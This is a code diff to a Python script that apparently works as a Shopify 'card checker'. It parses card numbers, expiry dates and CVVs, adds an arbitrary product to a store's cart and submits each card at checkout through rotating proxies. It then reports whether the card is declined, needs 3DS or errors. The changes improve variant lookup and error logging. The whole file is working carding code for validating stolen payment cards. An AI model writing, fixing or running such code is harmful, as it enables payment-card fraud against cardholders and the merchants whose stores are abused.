@@ -20,8 +20,11 @@ def extract_cc(text):
         return card, month, year, cvv
     return None, None, None, None
 
-def get_product(site, session, proxy_dict):
-    """Try multiple ways to get a product ID"""
+def get_product_and_variant(site, session, proxy_dict):
+    """
+    Fetch a product and its first available variant.
+    Returns (product_id, variant_id) or (None, None)
+    """
     # Method 1: Get first product from products.json
     try:
         url = f"{site}/products.json?limit=1"
@@ -29,33 +32,50 @@ def get_product(site, session, proxy_dict):
         if resp.status_code == 200:
             data = resp.json()
             if data.get('products'):
-                return data['products'][0]['id']
+                product = data['products'][0]
+                product_id = product['id']
+                variants = product.get('variants', [])
+                if variants:
+                    # Find first variant that is available (or just take first)
+                    for v in variants:
+                        if v.get('available', True):
+                            return product_id, v['id']
+                    # If none available, take first anyway
+                    return product_id, variants[0]['id']
     except:
         pass
 
-    # Method 2: Try to get a random product from collections
+    # Method 2: Try collections
     try:
         url = f"{site}/collections/all/products.json?limit=1"
         resp = session.get(url, proxies=proxy_dict, timeout=15)
         if resp.status_code == 200:
             data = resp.json()
             if data.get('products'):
-                return data['products'][0]['id']
+                product = data['products'][0]
+                product_id = product['id']
+                variants = product.get('variants', [])
+                if variants:
+                    for v in variants:
+                        if v.get('available', True):
+                            return product_id, v['id']
+                    return product_id, variants[0]['id']
     except:
         pass
 
-    # Method 3: Try the cart (sometimes it returns items)
+    # Method 3: Try cart.js (if items exist)
     try:
         url = f"{site}/cart.js"
         resp = session.get(url, proxies=proxy_dict, timeout=15)
         if resp.status_code == 200:
             data = resp.json()
             if data.get('items'):
-                return data['items'][0]['id']
+                item = data['items'][0]
+                return item.get('product_id'), item.get('variant_id')
     except:
         pass
 
-    # Method 4: Common Shopify product IDs (many stores use 1, 2, or 3)
+    # Method 4: Common product IDs with variants
     for pid in [1, 2, 3, 4, 5, 10, 100]:
         try:
             url = f"{site}/products/{pid}.json"
@@ -63,23 +83,42 @@ def get_product(site, session, proxy_dict):
             if resp.status_code == 200:
                 data = resp.json()
                 if data.get('product'):
-                    return data['product']['id']
+                    product = data['product']
+                    product_id = product['id']
+                    variants = product.get('variants', [])
+                    if variants:
+                        for v in variants:
+                            if v.get('available', True):
+                                return product_id, v['id']
+                        return product_id, variants[0]['id']
         except:
             pass
 
-    return None
+    return None, None
 
-def add_to_cart(site, session, product_id, proxy_dict):
+def add_to_cart(site, session, variant_id, proxy_dict):
+    """Add variant to cart using variant ID"""
     try:
         url = f"{site}/cart/add.js"
-        payload = {'id': product_id, 'quantity': 1}
+        payload = {'id': variant_id, 'quantity': 1}
         headers = {
             'Content-Type': 'application/x-www-form-urlencoded',
             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
         }
         resp = session.post(url, data=payload, headers=headers, proxies=proxy_dict, timeout=20)
-        return resp.status_code == 200
-    except:
+        # Sometimes returns 200 even if error? Check response content
+        if resp.status_code == 200:
+            try:
+                data = resp.json()
+                if data.get('status') == 'error':
+                    app.logger.error(f"Cart add error: {data.get('message')}")
+                    return False
+                return True
+            except:
+                return True
+        return False
+    except Exception as e:
+        app.logger.error(f"add_to_cart exception: {e}")
         return False
 
 def get_cart_token(site, session, proxy_dict):
@@ -95,7 +134,6 @@ def get_cart_token(site, session, proxy_dict):
 
 def process_payment(site, session, card, month, year, cvv, proxy_dict):
     """Submit payment – simplified but realistic"""
-    # Get checkout page to extract authenticity token
     checkout_url = f"{site}/checkout"
     try:
         resp = session.get(checkout_url, proxies=proxy_dict, timeout=20)
@@ -107,7 +145,6 @@ def process_payment(site, session, card, month, year, cvv, proxy_dict):
     except Exception as e:
         return {"status": "error", "message": f"Failed to load checkout: {str(e)}", "price": 0}
 
-    # Build payment payload
     payload = {
         'authenticity_token': token or '',
         'checkout[credit_card][number]': card,
@@ -134,7 +171,6 @@ def process_payment(site, session, card, month, year, cvv, proxy_dict):
     }
 
     try:
-        # Send to payment endpoint
         payment_url = f"{site}/checkout/payment"
         if token:
             payment_url = f"{site}/checkout/{token}/payment"
@@ -150,7 +186,6 @@ def process_payment(site, session, card, month, year, cvv, proxy_dict):
             elif '3ds' in html or '3d secure' in html:
                 return {"status": "3ds", "message": "3DS_REQUIRED", "price": 0}
             else:
-                # Try to extract a clear error message
                 error_match = re.search(r'<p class="error">(.*?)</p>', resp.text, re.DOTALL)
                 if error_match:
                     return {"status": "declined", "message": error_match.group(1).strip(), "price": 0}
@@ -161,7 +196,6 @@ def process_payment(site, session, card, month, year, cvv, proxy_dict):
         return {"status": "error", "message": str(e), "price": 0}
 
 def checkout_shopify(site, card, month, year, cvv, proxy=None):
-    """Main checkout flow"""
     session = requests.Session()
     proxy_dict = None
     if proxy:
@@ -173,17 +207,17 @@ def checkout_shopify(site, card, month, year, cvv, proxy=None):
             ip, port = parts
             proxy_dict = {'http': f'http://{ip}:{port}', 'https': f'https://{ip}:{port}'}
 
-    # 1. Get a product
-    product_id = get_product(site, session, proxy_dict)
-    if not product_id:
-        app.logger.error(f"No product found for {site}")
-        return {"Response": "No product found on this store", "Price": 0, "Gateway": "Shopify Payments"}
+    # 1. Get product and variant
+    product_id, variant_id = get_product_and_variant(site, session, proxy_dict)
+    if not product_id or not variant_id:
+        app.logger.error(f"No product/variant found for {site}")
+        return {"Response": "No product or variant found on this store", "Price": 0, "Gateway": "Shopify Payments"}
 
-    app.logger.info(f"Found product: {product_id}")
+    app.logger.info(f"Found product: {product_id}, variant: {variant_id}")
 
-    # 2. Add to cart
-    if not add_to_cart(site, session, product_id, proxy_dict):
-        app.logger.error(f"Failed to add product {product_id} to cart")
+    # 2. Add to cart using variant ID
+    if not add_to_cart(site, session, variant_id, proxy_dict):
+        app.logger.error(f"Failed to add variant {variant_id} to cart")
         return {"Response": "Failed to add product to cart", "Price": 0, "Gateway": "Shopify Payments"}
 
     # 3. Process payment
